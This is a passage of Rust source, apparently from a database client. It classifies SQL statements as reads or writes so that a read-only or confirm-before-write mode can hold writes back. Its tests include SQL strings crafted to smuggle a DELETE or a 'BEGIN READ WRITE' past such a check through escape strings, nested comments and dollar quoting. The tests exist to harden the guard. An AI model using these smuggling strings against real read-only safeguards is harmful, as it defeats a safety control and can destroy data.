    }
    out
}

/// Every identifier in `sql`, lower-cased, quotes taken off (strings and
/// comments left out): which columns a statement names.
pub fn identifiers(sql: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for tok in tokenize(sql, Dialect::Either).iter().flatten() {
        let name = match tok {
            Tok::Word(_, text) => text.to_lowercase(),
            Tok::Quoted(_) => tok.name().unwrap_or_default().to_lowercase(),
            _ => continue,
        };
        if !out.contains(&name) {
            out.push(name);
        }
    }
    out
}

/// SQLite pragmas whose argument names what they read
/// (`PRAGMA table_info(t)`); any other's argument sets it
/// (`PRAGMA user_version(3)`).
const PRAGMA_QUERIES: &[&str] = &[
    "TABLE_INFO",
    "TABLE_XINFO",
    "TABLE_LIST",
    "INDEX_INFO",
    "INDEX_XINFO",
    "INDEX_LIST",
    "FOREIGN_KEY_LIST",
    "FOREIGN_KEY_CHECK",
    "INTEGRITY_CHECK",
    "QUICK_CHECK",
];

/// SQLite pragmas that change the database even without a value:
/// `optimize` runs ANALYZE, `incremental_vacuum` frees pages,
/// `wal_checkpoint` writes the WAL's pages into the database file. Every
/// other one without a value only reports (`shrink_memory` frees the
/// connection's cache and changes nothing stored).
const PRAGMA_ACTIONS: &[&str] = &["OPTIMIZE", "INCREMENTAL_VACUUM", "WAL_CHECKPOINT"];

/// Object types that follow CREATE / ALTER / DROP (first word only).
const OBJECT_TYPES: &[&str] = &[
    "TABLE",
    "INDEX",
    "VIEW",
    "MATERIALIZED",
    "SCHEMA",
    "SEQUENCE",
    "FUNCTION",
    "PROCEDURE",
    "TYPE",
    "DATABASE",
    "EXTENSION",
    "TRIGGER",
    "ROLE",
    "USER",
    "POLICY",
    "DOMAIN",
    "COLUMN",
    "CONSTRAINT",
    "OWNED",
    "RULE",
    "PUBLICATION",
    "SUBSCRIPTION",
    "SERVER",
    "TABLESPACE",
    "COLLATION",
    "AGGREGATE",
    "OPERATOR",
    "EVENT",
    "FOREIGN",
    "GROUP",
    "STATISTICS",
    "TEXT",
    "LANGUAGE",
    "CAST",
    "CONVERSION",
    "ACCESS",
    "DEFAULT",
];

/// Words skipped between a verb and the object it names.
const MODIFIERS: &[&str] = &[
    "OR",
    "REPLACE",
    "TEMP",
    "TEMPORARY",
    "UNLOGGED",
    "UNIQUE",
    "GLOBAL",
    "LOCAL",
    "IF",
    "NOT",
    "EXISTS",
    "CONCURRENTLY",
    "ONLY",
    "INTO",
    "FROM",
    "TABLE",
    "RECURSIVE",
    "VIRTUAL",
    "IGNORE",
    "ABORT",
    "FAIL",
    "ROLLBACK",
    "LOW_PRIORITY",
    "DELAYED",
    "QUICK",
];

/// `EXPLAIN …` and `COPY (…) TO …` hold a statement of their own. They are
/// taken off in a loop, never by recursion, in one pass: the text may
/// repeat them thousands of times.
fn check_statement(all: &[Tok]) -> StatementCheck {
    // The statement looked at is `all[start..end]`.
    let (mut start, mut end) = (0, all.len());
    // Some(runs it) under an EXPLAIN; Some(to a file or program) under a COPY.
    let mut explain: Option<bool> = None;
    let mut copy_out: Option<bool> = None;
    let mut closes: Vec<Option<usize>> = Vec::new();
    let mut empty = None;
    loop {
        // `(SELECT …) UNION …`: judge by the first word.
        let lead = all[start..end]
            .iter()
            .take_while(|t| **t == Tok::Open)
            .count();
        if start + lead < end {
            start += lead;
        }
        let toks = &all[start..end];
        match toks[0].word() {
            Some("EXPLAIN") => {
                let (analyze, at) = explain_options(toks);
                explain = Some(explain.unwrap_or(false) || analyze);
                start += at;
            }
            Some("COPY") if toks.get(1) == Some(&Tok::Open) => {
                // `COPY (query) TO …`: the query may be a DML with RETURNING.
                if closes.is_empty() {
                    closes = closing_parens(all);
                }
                let Some(close) = closes[start + 1].filter(|&c| c < end) else {
                    return write_verb("COPY");
                };
                let after = &all[close + 1..end];
                if top_level(after).any(|t| t.is("FROM")) {
                    return write_verb("COPY");
                }
                copy_out = Some(copy_out.unwrap_or(false) || copies_out(after));
                start += 2;
                end = close;
            }
            _ => break,
        }
        if start >= end {
            empty = toks[0].word();
            break;
        }
    }
    let mut check = match empty {
        // A wrapper with nothing in it: EXPLAIN reads, COPY fails closed.
        Some("EXPLAIN") => StatementCheck {
            kind: StatementKind::Read,
            verb: "EXPLAIN".into(),
            target: None,
            destructive: false,
            unlocks_writes: false,
        },
        Some(_) => write_verb("COPY"),
        None => plain_check(&all[start..end]),
    };
    if let Some(analyze) = explain {
        // `EXPLAIN ANALYZE` runs its statement, so it is checked like the
        // statement; any other EXPLAIN only plans it.
        check = if analyze && check.changes_data() {
            StatementCheck {
                verb: format!("EXPLAIN ANALYZE {}", check.verb),
                ..check
            }
        } else {
            StatementCheck {
                kind: StatementKind::Read,
                verb: "EXPLAIN".into(),
                target: None,
                destructive: false,
                unlocks_writes: false,
            }
        };
    }
    match copy_out {
        Some(true) => write_verb("COPY"),
        Some(false) if !check.changes_data() => StatementCheck {
            verb: "COPY".into(),
            ..check
        },
        _ => check,
    }
}

/// A write known only by its verb.
fn write_verb(verb: &str) -> StatementCheck {
    StatementCheck {
        kind: StatementKind::Write,
        verb: verb.into(),
        target: None,
        destructive: false,
        unlocks_writes: false,
    }
}

/// For each `(` in `toks`, the index of the `)` that closes it.
fn closing_parens(toks: &[Tok]) -> Vec<Option<usize>> {
    let mut out = vec![None; toks.len()];
    let mut open = Vec::new();
    for (k, t) in toks.iter().enumerate() {
        match t {
            Tok::Open => open.push(k),
            Tok::Close => {
                if let Some(o) = open.pop() {
                    out[o] = Some(k);
                }
            }
            _ => {}
        }
    }
    out
}

/// Whether a COPY's `TO …` (in `toks`, after its table or query) sends
/// the rows anywhere but back to the client: a server file or a program
/// the server runs. Those change something outside the database, so they
/// count as writes, as `pg_terminate_backend` does; and a read-only
/// transaction doesn't stop them. No `TO` at all fails closed.
fn copies_out(toks: &[Tok]) -> bool {
    let mut level = top_level(toks);
    !(level.any(|t| t.is("TO")) && level.next().is_some_and(|t| t.is("STDOUT")))
}

/// A statement that isn't EXPLAIN or `COPY (…)`, by its first word.
fn plain_check(toks: &[Tok]) -> StatementCheck {
    let first = toks[0].word().unwrap_or("");
    let session = |unlocks: bool| StatementCheck {
        kind: StatementKind::Session,
        verb: first.to_string(),
        target: None,
        destructive: false,
        unlocks_writes: unlocks,
    };
    let read = || StatementCheck {
        kind: StatementKind::Read,
        verb: first.to_string(),
        target: None,
        destructive: false,
        unlocks_writes: false,
    };
    match first {
        "SELECT" => {
            // `SELECT … INTO new_table` creates a table (Postgres).
            if top_level(toks).any(|t| t.is("INTO")) {
                data_check(toks, "SELECT INTO", 0)
            } else {
                read()
            }
        }
        "WITH" => {
            // A data-modifying CTE or main statement makes the whole run a
            // write, and so do `… SELECT … INTO new_table` (Postgres) and
            // `… REPLACE INTO t` (SQLite; `replace(…)` is a function).
            // `FOR [NO KEY] UPDATE` locks rows; it changes none.
            let found = toks.iter().enumerate().find_map(|(p, t)| {
                let locking = p > 0 && (toks[p - 1].is("FOR") || toks[p - 1].is("KEY"));
                let verb = match t.word()? {
                    "UPDATE" if locking => return None,
                    w @ ("INSERT" | "UPDATE" | "DELETE" | "MERGE") => w,
                    "REPLACE" if toks.get(p + 1).is_some_and(|t| t.is("INTO")) => "REPLACE",
                    "INTO" => "SELECT INTO",
                    _ => return None,
                };
                Some((p, verb))
            });
            match found {
                Some((p, verb)) => data_check(toks, verb, p),
                None => read(),
            }
        }
        "SHOW" | "VALUES" | "TABLE" | "FETCH" | "MOVE" | "DECLARE" | "CLOSE" | "LISTEN"
        | "UNLISTEN" | "DESCRIBE" | "DESC" => read(),
        "PRAGMA" => {
            // `PRAGMA [schema.]name`, then `= value` or `(value)` to set it,
            // except for the pragmas whose argument names what they read.
            let at = if toks.get(2) == Some(&Tok::Dot) { 3 } else { 1 };
            let name = match toks.get(at) {
                Some(Tok::Str(Some(s))) => s.to_ascii_uppercase(),
                Some(t) => t.name().unwrap_or_default(),
                None => String::new(),
            };
            let sets = toks.contains(&Tok::Other('='));
            let arg = toks.contains(&Tok::Open);
            if name == "QUERY_ONLY" && (sets || arg) {
                session(true)
            } else if sets
                || (arg && !PRAGMA_QUERIES.contains(&name.as_str()))
                || PRAGMA_ACTIONS.contains(&name.as_str())
            {
                write_verb("PRAGMA")
            } else {
                read()
            }
        }
        "SET" | "RESET" | "BEGIN" | "START" | "COMMIT" | "END" | "ROLLBACK" | "ABORT"
        | "SAVEPOINT" | "RELEASE" | "DISCARD" | "DEALLOCATE" | "PREPARE" => {
            session(unlocks_writes(first, toks))
        }
        "INSERT" | "UPDATE" | "DELETE" | "MERGE" | "UPSERT" | "REPLACE" => {
            data_check(toks, first, 0)
        }
        "COPY" => {
            // `COPY t TO STDOUT` reads; `COPY (…)` is taken off before this.
            if top_level(toks).any(|t| t.is("FROM")) || copies_out(toks) {
                data_check(toks, "COPY", 0)
            } else {
                read()
            }
        }
        "CREATE" | "ALTER" | "DROP" | "TRUNCATE" | "GRANT" | "REVOKE" | "COMMENT" | "REINDEX"
        | "VACUUM" | "CLUSTER" | "ANALYZE" | "ANALYSE" | "SECURITY" | "IMPORT" | "REASSIGN"
        | "ATTACH" | "DETACH" | "REFRESH" => schema_check(toks, first),
        _ => StatementCheck {
            // CALL, DO, EXECUTE, LOCK, NOTIFY and anything unrecognised.
            kind: StatementKind::Write,
            verb: toks[0]
                .word()
                .map(str::to_string)
                .unwrap_or_else(|| "Statement".into()),
            target: None,
            destructive: false,
            unlocks_writes: false,
        },
    }
}

/// Tokens outside any parentheses.
fn top_level(toks: &[Tok]) -> impl Iterator<Item = &Tok> {
    let mut depth = 0i32;
    toks.iter().filter(move |t| {
        match t {
            Tok::Open => depth += 1,
            Tok::Close => depth -= 1,
            _ => return depth == 0,
        }
        false
    })
}

/// INSERT / UPDATE / DELETE / MERGE starting at `at`.
fn data_check(toks: &[Tok], verb: &str, at: usize) -> StatementCheck {
    let rest = &toks[at..];
    let target = if verb == "SELECT INTO" {
        let into = rest.iter().position(|t| t.is("INTO")).unwrap_or(0);
        object_name(&rest[into + 1..])
    } else {
        object_name(&rest[1..])
    };
    // DELETE / UPDATE with no WHERE at their own level touch every row.
    let destructive = matches!(verb, "DELETE" | "UPDATE") && {
        let mut depth = 0i32;
        !rest.iter().any(|t| {
            match t {
                Tok::Open => depth += 1,
                Tok::Close => depth -= 1,
                _ => {}
            }
            depth == 0 && t.is("WHERE")
        })
    };
    StatementCheck {
        kind: StatementKind::Write,
        verb: verb.to_string(),
        target,
        destructive,
        unlocks_writes: false,
    }
}

fn schema_check(toks: &[Tok], first: &str) -> StatementCheck {
    let mut verb = first.to_string();
    let mut i = 1;
    while i < toks.len()
        && toks[i]
            .word()
            .is_some_and(|w| MODIFIERS.contains(&w) && w != "TABLE")
    {
        i += 1;
    }
    if matches!(first, "CREATE" | "ALTER" | "DROP" | "COMMENT" | "REFRESH") {
        if first == "COMMENT" {
            // COMMENT ON TABLE x
            if toks.get(i).is_some_and(|t| t.is("ON")) {
                i += 1;
            }
        }
        if let Some(obj) = toks
            .get(i)
            .and_then(Tok::word)
            .filter(|w| OBJECT_TYPES.contains(w))
        {
            verb.push(' ');
            verb.push_str(obj);
            i += 1;
            if obj == "MATERIALIZED" && toks.get(i).is_some_and(|t| t.is("VIEW")) {
                verb.push_str(" VIEW");
                i += 1;
            }
        }
    }
    let target = if matches!(
        first,
        "GRANT" | "REVOKE" | "SECURITY" | "IMPORT" | "REASSIGN"
    ) {
        None
    } else {
        object_name(&toks[i.min(toks.len())..])
    };
    StatementCheck {
        kind: StatementKind::Schema,
        destructive: matches!(first, "DROP" | "TRUNCATE"),
        verb,
        target,
        unlocks_writes: false,
    }
}

/// Whether the `EXPLAIN` starting `toks` runs its statement (ANALYZE), and
/// where in `toks` the statement starts.
fn explain_options(toks: &[Tok]) -> (bool, usize) {
    let mut i = 1;
    let mut analyze = false;
    if toks.get(1) == Some(&Tok::Open) {
        // EXPLAIN (ANALYZE, BUFFERS) …; `ANALYZE false` / `off` doesn't run
        // it. Options that never close leave no statement.
        let close = toks
            .iter()
            .skip(2)
            .position(|t| *t == Tok::Close)
            .map_or(toks.len(), |p| p + 2);
        let opts = toks.get(2..close).unwrap_or_default();
        analyze = opts.iter().enumerate().any(|(k, t)| {
            (t.is("ANALYZE") || t.is("ANALYSE"))
                && !opts
                    .get(k + 1)
                    .is_some_and(|v| v.is("FALSE") || v.is("OFF"))
        });
        i = close + 1;
    } else {
        while let Some(w) = toks.get(i).and_then(Tok::word) {
            match w {
                "ANALYZE" | "ANALYSE" => analyze = true,
                "VERBOSE" | "QUERY" | "PLAN" => {}
                _ => break,
            }
            i += 1;
        }
    }
    (analyze, i.min(toks.len()))
}

/// Statements that would let a read-only session write. Setting names
/// match quoted too: `SET "default_transaction_read_only" = off`.
fn unlocks_writes(first: &str, toks: &[Tok]) -> bool {
    let has = |w: &str| toks.iter().any(|t| t.name().as_deref() == Some(w));
    let read_write = toks.windows(2).any(|p| p[0].is("READ") && p[1].is("WRITE"));
    match first {
        "SET" | "RESET" => {
            read_write
                || has("TRANSACTION_READ_ONLY")
                || has("DEFAULT_TRANSACTION_READ_ONLY")
                || (first == "RESET" && has("ALL"))
        }
        "BEGIN" | "START" => read_write,
        "DISCARD" => has("ALL"),
        _ => false,
    }
}

/// The dotted name at the start of `toks`, skipping modifiers, as written.
fn object_name(toks: &[Tok]) -> Option<String> {
    let mut i = 0;
    while toks
        .get(i)
        .and_then(Tok::word)
        .is_some_and(|w| MODIFIERS.contains(&w))
    {
        i += 1;
    }
    let mut name = String::new();
    loop {
        match toks.get(i) {
            Some(Tok::Word(_, text)) => name.push_str(text),
            Some(Tok::Quoted(text)) => name.push_str(text),
            _ => break,
        }
        if toks.get(i + 1) == Some(&Tok::Dot) {
            name.push('.');
            i += 2;
        } else {
            break;
        }
    }
    (!name.is_empty() && !name.ends_with('.')).then_some(name)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_columns_an_update_sets() {
        let set = |sql: &str| assigned_columns(sql);
        assert_eq!(
            set("UPDATE t SET a = 1, \"Id\" = 2 WHERE id = 3"),
            ["A", "ID"]
        );
        assert_eq!(
            set("update only t set (a, b) = (1, 2), c = f(d, e)"),
            ["A", "B", "C"]
        );
        // What the right side reads, a subquery's WHERE included, isn't set.
        assert_eq!(
            set("UPDATE t SET a = (SELECT id FROM u WHERE u.x = 1), b = id WHERE id = 1"),
            ["A", "B"]
        );
        assert!(set("DELETE FROM t WHERE id = 1").is_empty());
        assert!(set("INSERT INTO t (id) VALUES (1)").is_empty());
    }

    #[test]
    fn proposed_changes_take_plain_row_statements_only() {
        let ok = row_changes(
            "UPDATE public.orders SET status = 'a;b' WHERE id = 1; -- done\n\
             INSERT INTO \"Notes\" (body) VALUES ('x'); DELETE FROM t",
        )
        .unwrap();
        assert_eq!(ok.len(), 3);
        assert_eq!(ok[0].target, "public.orders");
        assert_eq!(
            ok[0].sql,
            "UPDATE public.orders SET status = 'a;b' WHERE id = 1"
        );
        assert_eq!(ok[1].target, "\"Notes\"");
        assert!(ok[2].destructive && !ok[0].destructive);
        for bad in [
            "DROP TABLE t",
            "WITH x AS (SELECT 1) DELETE FROM t",
            "SELECT 1",
            "UPDATE t SET a = 1 RETURNING *",
            "UPDATE t SET a = u.a FROM u WHERE u.id = t.id",
            "DELETE FROM t USING u WHERE u.id = t.id",
            "CALL p()",
            "",
        ] {
            assert!(row_changes(bad).is_err(), "{bad}");
        }
        // FROM inside a subquery is fine.
        assert!(row_changes("UPDATE t SET a = 1 WHERE id IN (SELECT id FROM u)").is_ok());
        assert!(row_changes(&"DELETE FROM t WHERE id = 1;".repeat(21)).is_err());
    }

    #[test]
    fn identifiers_skip_strings_and_comments() {
        let ids = identifiers("UPDATE c SET \"Email\" = 'email' -- email\n WHERE id = 1");
        assert!(ids.contains(&"email".to_string()));
        assert_eq!(identifiers("SELECT 'email' /* email */"), vec!["select"]);
    }

    fn one(sql: &str) -> StatementCheck {
        let mut all = check_sql(sql, Dialect::Either);
        assert_eq!(all.len(), 1, "{sql}: {all:?}");
        all.remove(0)
    }

    fn kind(sql: &str) -> StatementKind {
        one(sql).kind
    }

    #[test]
    fn reads() {
        for sql in [
            "SELECT * FROM wallets",
            "select 1;",
            "  -- comment\n SELECT 'DELETE FROM x' AS hint",
            "WITH t AS (SELECT 1) SELECT * FROM t",
            "SHOW search_path",
            "EXPLAIN SELECT * FROM t",
            "EXPLAIN DELETE FROM t",
            "EXPLAIN (ANALYZE false) DELETE FROM t",
            "EXPLAIN ANALYZE SELECT 1",
            "EXPLAIN",
            "(SELECT 1) UNION (SELECT 2)",
            "VALUES (1), (2)",
            "TABLE wallets",
            "COPY wallets TO STDOUT",
            "COPY (SELECT 1) TO STDOUT",
            "PRAGMA table_info(wallets)",
            "PRAGMA user_version",
            "SELECT $$ drop table x $$",
            "SELECT \"update\" FROM t",
            "SELECT * FROM t FOR UPDATE",
        ] {
            assert_eq!(kind(sql), StatementKind::Read, "{sql}");
        }
    }

    #[test]
    fn writes() {
        for sql in [
            "INSERT INTO wallets (id) VALUES (1)",
            "UPDATE wallets SET balance = 0 WHERE id = 1",
            "DELETE FROM wallet_tx WHERE settled = false",
            "MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE",
            "WITH gone AS (DELETE FROM t RETURNING *) SELECT count(*) FROM gone",
            "WITH x AS (SELECT 1) INSERT INTO t SELECT * FROM x",
            "EXPLAIN ANALYZE DELETE FROM t",
            "EXPLAIN (ANALYZE, BUFFERS) UPDATE t SET a = 1",
            "COPY wallets FROM '/tmp/w.csv'",
            "SELECT * INTO archive FROM wallets",
            "CALL settle()",
            "DO $$ BEGIN DELETE FROM t; END $$",
            "LOCK TABLE t",
            "PRAGMA user_version = 3",
            "REPLACE INTO t VALUES (1)",
            "frobnicate the database",
        ] {
            assert_eq!(kind(sql), StatementKind::Write, "{sql}");
        }
    }

    #[test]
    fn schema_changes() {
        for (sql, verb, target) in [
            (
                "CREATE TABLE public.t (id int)",
                "CREATE TABLE",
                Some("public.t"),
            ),
            (
                "create unique index concurrently if not exists t_a on t (a)",
                "CREATE INDEX",
                Some("t_a"),
            ),
            (
                "CREATE OR REPLACE VIEW v AS SELECT 1",
                "CREATE VIEW",
                Some("v"),
            ),
            (
                "ALTER TABLE ONLY wallets DROP COLUMN note",
                "ALTER TABLE",
                Some("wallets"),
            ),
            (
                "DROP TABLE IF EXISTS \"Old Wallets\"",
                "DROP TABLE",
                Some("\"Old Wallets\""),
            ),
            (
                "DROP MATERIALIZED VIEW daily",
                "DROP MATERIALIZED VIEW",
                Some("daily"),
            ),
            ("TRUNCATE TABLE logs", "TRUNCATE", Some("logs")),
            ("TRUNCATE logs, events", "TRUNCATE", Some("logs")),
            (
                "REFRESH MATERIALIZED VIEW daily",
                "REFRESH MATERIALIZED VIEW",
                Some("daily"),
            ),
            ("GRANT SELECT ON t TO bob", "GRANT", None),
            ("COMMENT ON TABLE t IS 'x'", "COMMENT TABLE", Some("t")),
            ("VACUUM", "VACUUM", None),
        ] {
            let c = one(sql);
            assert_eq!(c.kind, StatementKind::Schema, "{sql}");
            assert_eq!(c.verb, verb, "{sql}");
            assert_eq!(c.target.as_deref(), target, "{sql}");
        }
    }

    #[test]
    fn session_statements() {
        for sql in [
            "SET search_path TO app",
            "BEGIN",
            "COMMIT",
            "ROLLBACK",
            "SAVEPOINT a",
        ] {
            let c = one(sql);
            assert_eq!(c.kind, StatementKind::Session, "{sql}");
            assert!(!c.unlocks_writes, "{sql}");
        }
        for sql in [
            "SET default_transaction_read_only = off",
            "SET SESSION transaction_read_only TO false",
            "SET SESSION CHARACTERISTICS AS TRANSACTION READ WRITE",
            "SET TRANSACTION READ WRITE",
            "BEGIN READ WRITE",
            "START TRANSACTION ISOLATION LEVEL SERIALIZABLE, READ WRITE",
            "RESET ALL",
            "RESET default_transaction_read_only",
            "DISCARD ALL",
            "PRAGMA query_only = 0",
            "PRAGMA query_only(false)",
        ] {
            assert!(one(sql).unlocks_writes, "{sql}");
        }
    }

    #[test]
    fn destructive_statements() {
        assert!(one("DELETE FROM users").destructive);
        assert!(one("UPDATE wallets SET balance = 0").destructive);
        assert!(one("UPDATE t SET a = (SELECT b FROM s WHERE s.id = 1)").destructive);
        assert!(one("DROP TABLE t").destructive);
        assert!(one("TRUNCATE t").destructive);
        assert!(!one("DELETE FROM users WHERE id = 1").destructive);
        assert!(!one("UPDATE t SET a = 1 WHERE id IN (SELECT id FROM s)").destructive);
        assert!(!one("CREATE TABLE t (id int)").destructive);
    }

    #[test]
    fn targets_as_written() {
        assert_eq!(
            one("DELETE FROM public.Wallet_Tx WHERE id = 1")
                .target
                .as_deref(),
            Some("public.Wallet_Tx")
        );
        assert_eq!(
            one("INSERT INTO \"Orders\" VALUES (1)").target.as_deref(),
            Some("\"Orders\"")
        );
        assert_eq!(one("UPDATE ONLY t SET a = 1").target.as_deref(), Some("t"));
        assert_eq!(
            one("SELECT a INTO TEMP backup FROM t").target.as_deref(),
            Some("backup")
        );
    }

    #[test]
    fn splits_statements_like_the_editor() {
        let all = check_sql(
            "SELECT ';'; -- ; \n DELETE FROM t; /* ; */ ;; SELECT $x$ ; $x$",
            Dialect::Either,
        );
        let kinds: Vec<_> = all.iter().map(|c| c.kind).collect();
        assert_eq!(
            kinds,
            [
                StatementKind::Read,
                StatementKind::Write,
                StatementKind::Read
            ]
        );
    }

    #[test]
    fn modes() {
        let sql = "SELECT 1; UPDATE t SET a = 1 WHERE id = 2";
        assert_eq!(hold_for(SafeMode::Off, sql, false, Dialect::Either), None);
        assert_eq!(
            hold_for(
                SafeMode::Confirm,
                "SELECT 1; SET x = 1",
                false,
                Dialect::Either
            ),
            None
        );
        let held = hold_for(SafeMode::Confirm, sql, false, Dialect::Either).unwrap();
        assert_eq!(held.action, HoldAction::Confirm);
        assert_eq!(held.statements.len(), 1);
        assert_eq!(held.statements[0].verb, "UPDATE");
        assert_eq!(
            hold_for(SafeMode::Confirm, sql, true, Dialect::Either),
            None
        );
        // Confirming never lets a read-only connection write.
        let refused = hold_for(SafeMode::ReadOnly, sql, true, Dialect::Either).unwrap();
        assert_eq!(refused.action, HoldAction::Refuse);
        // Unlocking writes is fine to confirm, refused when read-only.
        assert_eq!(
            hold_for(
                SafeMode::Confirm,
                "SET transaction_read_only = off",
                false,
                Dialect::Either
            ),
            None
        );
        assert!(hold_for(SafeMode::ReadOnly, "RESET ALL", false, Dialect::Either).is_some());
        assert_eq!(
            hold_for(
                SafeMode::ReadOnly,
                "SELECT * FROM t",
                false,
                Dialect::Either
            ),
            None
        );
    }

    #[test]
    fn serde_names() {
        assert_eq!(
            serde_json::to_string(&SafeMode::ReadOnly).unwrap(),
            "\"read_only\""
        );
        assert_eq!(
            serde_json::to_string(&StatementKind::Schema).unwrap(),
            "\"schema\""
        );
    }

    #[test]
    fn stopping_a_session_is_a_write() {
        for sql in [
            "SELECT pg_terminate_backend(42)",
            "select pg_cancel_backend(pid) from pg_stat_activity where state = 'active'",
            "WITH x AS (SELECT pg_catalog.pg_terminate_backend(1)) SELECT * FROM x",
        ] {
            let checks = check_sql(sql, Dialect::Either);
            assert_eq!(checks[0].kind, StatementKind::Write, "{sql}");
            assert!(
                hold_for(SafeMode::ReadOnly, sql, true, Dialect::Either).is_some(),
                "{sql}"
            );
            assert!(
                hold_for(SafeMode::Confirm, sql, false, Dialect::Either).is_some(),
                "{sql}"
            );
        }
        assert!(check_sql("SELECT pg_terminate_backend(1)", Dialect::Either)[0].destructive);
        assert!(!check_sql("SELECT pg_cancel_backend(1)", Dialect::Either)[0].destructive);
        // Named, not called: still a read.
        for sql in [
            "SELECT 'pg_terminate_backend(1)'",
            "SELECT proname FROM pg_proc WHERE proname = 'pg_cancel_backend'",
        ] {
            assert_eq!(
                check_sql(sql, Dialect::Either)[0].kind,
                StatementKind::Read,
                "{sql}"
            );
        }
    }

    #[test]
    fn locks_rows_finds_locking_clauses() {
        for sql in [
            "SELECT * FROM t FOR UPDATE",
            "select * from t for no key update skip locked",
            "SELECT * FROM t FOR SHARE OF t",
            "SELECT * FROM (SELECT * FROM t FOR KEY SHARE) s",
        ] {
            assert!(locks_rows(sql), "{sql}");
        }
        for sql in [
            "SELECT * FROM t",
            "SELECT substring(name FROM 1 FOR 3) FROM t",
            "SELECT 'for update' AS s",
            "SELECT \"for\" FROM t",
        ] {
            assert!(!locks_rows(sql), "{sql}");
        }
    }

    #[test]
    fn pages_by_cursor_only_unbounded_reads() {
        for sql in [
            "SELECT * FROM t",
            "select * from t;  -- all of it\n",
            "WITH x AS (SELECT * FROM t LIMIT 5) SELECT * FROM x",
            "VALUES (1), (2)",
            "TABLE t",
            "SELECT nextval('s') FROM generate_series(1, 10)",
            "SELECT 'limit 5; offset 1' AS s",
            "SELECT \"limit\" FROM t",
        ] {
            assert!(pages_by_cursor(sql, Dialect::Either), "{sql}");
        }
        for sql in [
            "SELECT * FROM t LIMIT 10",
            "SELECT * FROM t OFFSET 3",
            "SELECT * FROM t FETCH FIRST 3 ROWS ONLY",
            "SELECT * INTO t2 FROM t",
            "WITH d AS (DELETE FROM t RETURNING *) INSERT INTO u SELECT * FROM d",
            "SELECT 1; SELECT 2",
            "INSERT INTO t VALUES (1)",
            "BEGIN",
            "",
        ] {
            assert!(!pages_by_cursor(sql, Dialect::Either), "{sql}");
        }
    }

    fn kinds(sql: &str) -> Vec<StatementKind> {
        check_sql(sql, Dialect::Either)
            .iter()
            .map(|c| c.kind)
            .collect()
    }

    #[test]
    fn escape_strings_take_backslashes() {
        use StatementKind::*;
        // `E'\''` is one quote to Postgres, so the `;` after it splits; SQLite
        // has no E'…' and ends the string at `\'`, so it is unclear.
        assert_eq!(kinds("SELECT E'\\''; DELETE FROM t"), [Write, Write]);
        assert_eq!(one("SELECT e'\\''").verb, UNCLEAR_VERB);
        // `\\` is one backslash; `''` is still a quote inside E'…'.
        assert_eq!(kinds("SELECT E'\\\\'; DELETE FROM t"), [Read, Write]);
        assert_eq!(kinds("SELECT E'it''s; \\n'; DELETE FROM t"), [Read, Write]);
        // An escaped quote keeps the string open across a `;`.
        assert_eq!(kinds("SELECT E'\\'; DELETE FROM t; \\''"), [Write]);
        // A word ending in E is not a prefix; U&'…' is plain quoting.
        assert_eq!(kinds("SELECT the'x'; DELETE FROM t"), [Read, Write]);
        assert_eq!(kinds("SELECT U&'d\\0061t'; DELETE FROM t"), [Read, Write]);
        assert_eq!(identifiers("SELECT E'\\' email'"), vec!["select"]);
    }

    #[test]
    fn block_comments_nest() {
        use StatementKind::*;
        // Postgres reads `/* /* */ … */` as one comment, SQLite as a comment
        // and then text: either way the statement is a write.
        let sql = "SELECT 1 /* /* */ ; DELETE FROM t; */";
        assert_eq!(kinds(sql), [Write]);
        assert_eq!(one(sql).verb, UNCLEAR_VERB);
        assert_eq!(kinds("/* /* */ DELETE FROM t; */ SELECT 1"), [Write]);
        // A plain one is fine, `/*/` and `/**/` included.
        assert_eq!(
            kinds("SELECT /*/ ; */ 1 /**/; DELETE FROM t"),
            [Read, Write]
        );
    }

    #[test]
    fn dollar_tags_take_digits_after_the_first_character() {
        use StatementKind::*;
        assert_eq!(kinds("SELECT $a1$ ; DELETE FROM t; $a1$"), [Read]);
        assert_eq!(kinds("SELECT $_9$ x $_9$; DELETE FROM t"), [Read, Write]);
        assert_eq!(kinds("SELECT $é$ ; $é$; DELETE FROM t"), [Read, Write]);
        // `$1` is a parameter, not a tag: the `;` splits.
        assert_eq!(
            kinds("SELECT $1; DELETE FROM t; SELECT $1"),
            [Read, Write, Read]
        );
        assert_eq!(kinds("SELECT $1$ ; DELETE FROM t"), [Read, Write]);
        // An inner `$a$` doesn't end `$a1$`.
        assert_eq!(kinds("SELECT $a1$ $a$ ; DELETE $a1$"), [Read]);
    }

    #[test]
    fn unclear_text_fails_closed() {
        for sql in [
            "SELECT 'never ends",
            "SELECT E'never ends\\'",
            "SELECT \"never ends",
            "SELECT 1 /* never ends",
            "SELECT $x$ never ends",
            // `standard_conforming_strings = off` reads `\'` as a quote.
            "SELECT '\\'; DELETE FROM t; --'",
            "SELECT 'C:\\'",
        ] {
            let c = check_sql(sql, Dialect::Either).remove(0);
            assert_eq!(c.kind, StatementKind::Write, "{sql}");
            assert_eq!(c.verb, UNCLEAR_VERB, "{sql}");
            assert!(
                hold_for(SafeMode::ReadOnly, sql, true, Dialect::Either).is_some(),
                "{sql}"
            );
            assert!(
                hold_for(SafeMode::Confirm, sql, false, Dialect::Either).is_some(),
                "{sql}"
            );
            assert!(!pages_by_cursor(sql, Dialect::Either), "{sql}");
        }
        assert!(row_changes("UPDATE t SET a = 'x\\' WHERE id = 1").is_err());
        // A backslash elsewhere in a plain string is plain text.
        assert_eq!(kind("SELECT 'a\\b', '\\\\x'"), StatementKind::Read);
        // `--` to the end of the text is a finished comment.
        assert_eq!(kind("SELECT 1 -- no newline"), StatementKind::Read);
    }

    /// The audit's strings: each hid a write from safe mode.
    #[test]
    fn hidden_writes_are_seen() {
        let sql = "SELECT E'\\''; COMMIT; BEGIN READ WRITE; DELETE FROM t; COMMIT; --'";
        let checks = check_sql(sql, Dialect::Either);
        assert_eq!(checks.len(), 5, "{checks:?}");
        assert!(checks.iter().any(|c| c.verb == "DELETE" && c.destructive));
        assert!(checks.iter().any(|c| c.unlocks_writes));
        let held = hold_for(SafeMode::Confirm, sql, false, Dialect::Either).unwrap();
        assert!(held.statements.iter().any(|c| c.verb == "DELETE"));
        assert_eq!(
            hold_for(SafeMode::ReadOnly, sql, true, Dialect::Either)
                .unwrap()
                .action,
            HoldAction::Refuse
        );
        assert!(!pages_by_cursor(sql, Dialect::Either));
        for sql in [
            "SELECT 1 /* /* */ ; DELETE FROM t; */",
